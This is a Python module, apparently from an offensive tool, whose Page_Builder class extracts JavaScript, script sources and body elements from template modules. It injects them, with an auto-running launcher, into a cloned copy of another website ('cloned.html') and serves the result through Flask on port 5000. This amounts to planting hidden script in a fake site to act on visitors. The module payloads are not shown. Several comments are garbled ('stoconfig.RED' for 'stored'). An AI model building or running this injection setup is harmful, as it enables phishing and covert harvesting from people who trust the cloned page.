from . import config
from . import server
from . import basic

class Page_Builder:
	def __init__(self,selected_modules):
		self.selected_modules = selected_modules #list of selected modules
		self.body = [] # <body> elements for the base HTML file
		self.src = [] # all <src> tags extracted from the selected modules are stoconfig.RED here for adding in the base HTML file
		self.funcs = [] # all function names extracted from the selected modules are stoconfig.RED here for adding in the base HTML file
		self.code = [] # all function codes extracted from the selected modules are stoconfig.RED here for adding the base HTML file.

	def extract_code(self,name): # Extracting function code from a module
		with open('core/templates/'+name,'r') as f:
			p = iter(f.read().split('\n'))
			for i in p:
				if i == '//MLB-START':
					while True:
						a = next(p,None)
						if a!= '//MLB-END':
							self.code.append(a.replace('//MLB-CALL',''))
						else:
							self.code.append('\n\n')
							break
					break

	def extract_src(self,name): # Extracting src from a module
		with open('core/templates/'+name,'r') as f:
			p = iter(f.read().split('\n'))
			for i in p:
				if i == '<!-- MLB_SRC -->':
					b = next(p,None)
					for e in b.split(' '):
						if 'src="' in e and not e in self.src:
							self.src.append(b)

	def extract_body(self,name): # Extracting required elements of the <body> tag from a module
		with open('core/templates/'+name,'r') as f:
			p = iter(f.read().split('\n'))
			for i in p:
				if i == '<!-- MLB-BODY -->':
					while True:
						a = next(p,None)
						if not '</body>' in a and not '<body>' in a:
							self.body.append(a)
						elif '</body>' in a:
							self.body.append('\n\n')
							break
					break

	def extract_function_name(self,name): # Extracting function names of a module
		with open('core/templates/'+name,'r') as f:
			p = iter(f.read().split('\n'))
			for i in p:
				if i=='//MLB-CALL':
					a = next(p,None)
					for i in a.strip().split(' '):
						if '()' in i:
							self.funcs.append(i.strip('{'))
	
	def inject_in_cloned_page(self):
		temp = ''
		for module in self.selected_modules:
			basic.print_status('Extracting Code.'+config.YELLOW+f'[{module}]'+config.WHITE)
			self.extract_code(module)
			basic.print_status('Extracting <script src.'+config.YELLOW+f'[{module}]'+config.WHITE)
			self.extract_src(module)
			basic.print_status('Extracting body.'+config.YELLOW+f'[{module}]'+config.WHITE)
			self.extract_body(module)
			basic.print_status('Extracting Function Names.'+config.YELLOW+f'[{module}]'+config.WHITE)
			self.extract_function_name(module)
		basic.print_status('Starting merging process.')
		with open('core/templates/final.html','wb') as f:
			for i in self.src:
				temp+=i+'\n'
			for i in self.body:
				temp+=i+'\n'
			temp+='</body>\n'
			temp+='<script>\n'
			for i in self.code:
				temp+=i+'\n'
			a = ''
			for i in self.funcs:
				a+=i.strip()+'\nawait MLBsleep(2000);\n'
			temp+='''function MLBsleep(ms) {
					return new Promise(resolve => setTimeout(resolve, ms));
					}
async function mlb_launch() {
await MLBsleep(2000);
%s
				}
				'''%a.strip()
			temp+='\nmlb_launch();'
			temp+='\n</script>\n</html>'
			basic.print_status('Merged templates.')
			basic.print_status('Now merging with cloned site.')
			with open('core/cloned.html','r',encoding='latin-1') as f2:
				f.write(bytes(f2.read().replace('</html>', '').replace('</body>','')+'\n'+temp,'utf-8'))
		basic.print_status('MERGED.')
		server.server(5000,1)

	def build_page(self): # Calling all the above functions and bulding the base HTML file.
		'''
		Checking the number of selected modules is more than 1 or not,
		if it's more than 1 then the merging process will begin,
		if it;s not more than 1 then we simply run flask wtih the selected module as the base template.
		'''
		if len(self.selected_modules) != 1:
			for i in self.selected_modules:
				basic.print_status('Extracting Code.'+config.YELLOW+f'[{i}]'+config.WHITE)
				self.extract_code(i)
				basic.print_status('Extracting <script src.'+config.YELLOW+f'[{i}]'+config.WHITE)
				self.extract_src(i)
				basic.print_status('Extracting body.'+config.YELLOW+f'[{i}]'+config.WHITE)
				self.extract_body(i)
				basic.print_status('Extracting Function Names.'+config.YELLOW+f'[{i}]'+config.WHITE)
				self.extract_function_name(i)
			basic.print_status('Merging Modules.')
			'''
			Writing the base HTML file:
			'''
			with open('core/templates/final.html','w') as f:
				f.write('<html>\n<head>\n')
				for i in self.src:
					f.write(i+'\n')
				f.write('</head>\n')
				f.write('<body>\n')
				for i in self.body:
					f.write(i+'\n')
				f.write('</body>\n')
				f.write('<script>\n')
				for i in self.code:
					f.write(i+'\n')
				a = ''
				for i in self.funcs:
					a+=i.strip()+'\nawait MLBsleep(2000);\n'
				f.write('''function MLBsleep(ms) {
						return new Promise(resolve => setTimeout(resolve, ms));
						}
async function mlb_launch() {
await MLBsleep(2000);
%s
					}
					'''%a.strip())
				f.write('\nmlb_launch();')
				f.write('\n</script>\n</html>')
			basic.print_status('MERGED.')
		# Running the flask server
			server.server(5000,1)
		else:
			server.server(5000,0,self.selected_modules[0])
